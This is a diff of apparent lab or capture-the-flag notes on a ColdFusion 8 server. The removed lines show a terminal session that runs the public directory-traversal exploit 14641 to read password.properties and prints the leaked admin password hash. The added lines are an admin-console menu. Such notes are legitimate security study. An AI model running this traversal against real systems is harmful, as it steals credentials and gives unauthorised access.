@@ -1,78 +1,66 @@
-hippoeug@kali:~$ searchsploit -m 14641.py
-  Exploit: Adobe ColdFusion - Directory Traversal
-      URL: https://www.exploit-db.com/exploits/14641
-     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
-File Type: Python script, ASCII text executable, with CRLF line terminators
-
-Copied to: /home/hippoeug/14641.py
-
-=======
-
-hippoeug@kali:~$ python 14641.py
-usage: 14641.py <host> <port> <file_path>
-example: 14641.py localhost 80 ../../../../../../../lib/password.properties
-if successful, the file will be printed
-
-hippoeug@kali:~$ python 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties
-------------------------------
-trying /CFIDE/wizards/common/_logintowizard.cfm
-title from server in /CFIDE/wizards/common/_logintowizard.cfm:
-------------------------------
-#Wed Mar 22 20:53:51 EET 2017
-rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
-password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
-encrypted=true
-------------------------------
-------------------------------
-trying /CFIDE/administrator/archives/index.cfm
-title from server in /CFIDE/administrator/archives/index.cfm:
-------------------------------
-#Wed Mar 22 20:53:51 EET 2017
-rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
-password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
-encrypted=true
-------------------------------
-------------------------------
-trying /cfide/install.cfm
-title from server in /cfide/install.cfm:
-------------------------------
-#Wed Mar 22 20:53:51 EET 2017
-rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
-password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
-encrypted=true
-------------------------------
-------------------------------
-trying /CFIDE/administrator/entman/index.cfm
-title from server in /CFIDE/administrator/entman/index.cfm:
-------------------------------
-#Wed Mar 22 20:53:51 EET 2017
-rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
-password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
-encrypted=true
-------------------------------
-------------------------------
-trying /CFIDE/administrator/enter.cfm
-title from server in /CFIDE/administrator/enter.cfm:
-------------------------------
-#Wed Mar 22 20:53:51 EET 2017
-rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
-password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
-encrypted=true
-------------------------------
-
-
-
-
-
-
-
-
-
-
-=======
-
-http://10.10.10.11:8500/CFIDE/wizards/common/_logintowizard.cfm
-http://10.10.10.11:8500/CFIDE/wizards/common/_authenticatewizarduser.cfm
-
-======
+ 	
+Expand All / Collapse All
+		
+	Server Settings 	
+		
+	Settings
+	Request Tuning
+	Caching
+	Client Variables
+	Memory Variables
+	Mappings
+	Mail
+	Charting
+	Font Management
+	Java and JVM
+	Settings Summary
+		
+	Data & Services 	
+		
+	Data Sources
+	Verity Collections
+	Verity K2 Server
+	Web Services
+	Flex Integration
+		
+	Click to CollapseDebugging & Logging 	
+		
+	Debug Output Settings
+	Debugging IP Addresses
+	Debugger Settings
+	Logging Settings
+	Log Files
+	Scheduled Tasks
+	System Probes
+	Code Analyzer
+	License Scanner
+		
+	Click to CollapseServer Monitoring 	
+		
+	Server Monitor
+		
+	Click to CollapseExtensions 	
+		
+	Java Applets
+	CFX Tags
+	Custom Tag Paths
+	CORBA Connectors
+		
+	Click to CollapseEvent Gateways 	
+		
+	Settings
+	Gateway Types
+	Gateway Instances
+		
+	Click to CollapseSecurity 	
+		
+	Administrator
+	RDS
+	Sandbox Security
+	User Manager
+		
+	Click to CollapsePackaging & Deployment 	
+		
+	ColdFusion Archives
+	J2EE Archives
 
